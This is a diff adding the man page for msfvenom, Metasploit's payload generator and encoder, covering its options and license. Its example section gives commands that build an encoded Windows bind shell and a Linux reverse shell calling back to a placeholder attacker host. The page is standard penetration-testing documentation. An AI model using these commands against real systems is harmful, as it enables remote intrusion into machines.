@@ -1,0 +1,136 @@
+.TH MSFVENOM 1 "July 23, 2015" "4.11.4" "Metasploit Framework - msfvenom"
+.SH NAME
+msfvenom - Payload Generator and Encoder
+.SH SYNOPSIS
+msfvenom [options] <var=val>
+.SH DESCRIPTION
+.B
+Msfvenom 
+is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. Msfvenom has replaced both msfpayload and msfencode as of 
+.B
+June 8th, 2015.
+.SH OPTIONS
+.PP
+-p, --payload [payload]	Payload to use. Specify a '-' or stdin to use custom payloads
+.br
+    --payload-options	List the payload's standard options
+.TP
+-l, --list  [module_type]   
+List a module type example: payloads, encoders, nops, all
+.TP
+-n, --nopsled  [length]        
+Prepend a nopsled of [length] size on to the payload
+.TP
+-f, --format  [format]        
+Output format (use --help-formats for a list)
+.TP
+--help-formats               
+List available formats
+.TP
+-e, --encoder  [encoder]       
+The encoder to use
+.TP
+-a, --arch  [architecture]  
+The architecture to use
+.TP
+--platform   [platform]      
+The platform of the payload
+.br
+Cisco or cisco, OSX or osx, Solaris or solaris, BSD or bsd, OpenBSD or openbsd, Firefox or firefox, BSDi or bsdi, NetBSD or netbsd, NodeJS or nodejs, FreeBSD or freebsd, Python or python, AIX or aix, JavaScript or javascript, HPUX or hpux, PHP or php, Irix or irix, Unix or unix, Linux or linux, Ruby or ruby, Java or java, Android or android, Netware or netware, Windows or windows
+.PP
+-s, --space [length]
+The maximum size of the resulting payload
+.br
+    --encoder-space [length] 
+      The maximum size of the encoded payload (defaults to the -s value)
+.TP
+-b, --bad-chars  [list]          
+The list of characters to avoid example: '\\x00\\xff'
+.TP
+-i, --iterations  [count]         
+The number of times to encode the payload
+.TP
+-c, --add-code  [path]          
+Specify an additional win32 shellcode file to include
+.TP
+-x, --template  [path]          
+Specify a custom executable file to use as a template
+.TP
+-k, --keep                       
+Preserve the template behavior and inject the payload as a new thread
+.TP
+-o, --out  [path]              
+Save the payload
+.TP
+-v, --var-name  [name]
+Specify a custom variable name to use for certain output formats
+.TP
+--smallest
+Generate the smallest possible payload
+.TP
+-h, --help                       
+Show this message
+.TP
+--help-formats               
+List available formats
+.SH EXAMPLE
+msfvenom --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b "\\x00" -f python
+.br
+msfvenom --platform linux -p linux/x86/shell/reverse_tcp LHOST=w.z.y.z LPORT=443 -b "\\x00" -f elf -o file.bin
+.br
+
+
+For more examples visit
+.B
+https://www.offensive-security.com/metasploit-unleashed/msfvenom
+.SH SEE ALSO
+msfcli(1) -
+.I
+deprecated
+-
+.br
+msfconsole(1)
+.br
+msfpayload(1) -
+.I
+deprecated
+-
+.br
+msfencode(1) -
+.I
+deprecated
+-
+.SH AUTHOR(S)
+.TP
+.B
+Creator
+HD Moore - @hdmoore / hdm@metasploit.com
+.br
+Man Page Author: Kali Linux\*(Tm
+File man page bug reports at 
+.B
+https://bugs.kali.org
+.SH COPYRIGHT
+Copyright (C) 2006-2015, Rapid7 Inc.
+All rights reserved.
+
+Redistribution and use in source and binary forms, with or without modification,
+are permitted provided that the following conditions are met:
+.TP
+* 
+Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
+.TP
+* 
+Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. 
+.TP
+* 
+Neither the name of Rapid7 LLC nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. 
+
+The Metasploit Framework is provided under the 3-clause BSD license above.
+
+The copyright on this package is held by Rapid7 LLC.
+
+This license does not apply to several components within the Metasploit
+Framework source tree.  For more details see the LICENSE file.
